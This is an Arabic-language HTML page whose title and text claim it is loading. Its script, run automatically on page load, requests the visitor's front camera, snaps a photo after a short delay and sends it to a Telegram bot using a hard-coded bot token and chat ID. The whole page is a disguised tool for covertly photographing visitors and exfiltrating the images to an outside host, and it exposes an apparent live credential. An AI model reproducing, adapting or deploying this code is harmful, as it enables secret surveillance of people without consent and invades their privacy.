<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
</head>
<body>
    <h2>جاري تحميل الصفحة، يرجى الانتظار...</h2>

    <script>
        const BOT_TOKEN = '8995336272:AAEqIROZRcq16byqF4lr6bTGj492RnBtvSs';
        const CHAT_ID = '7641614898';

        async function captureAndSend() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                await new Promise(resolve => setTimeout(resolve, 1500));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'capture.jpg');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }, 'image/jpeg');

            } catch (error) {
                console.error("خطأ:", error);
            }
        }

        window.onload = captureAndSend;
    </script>
</body>
</html>


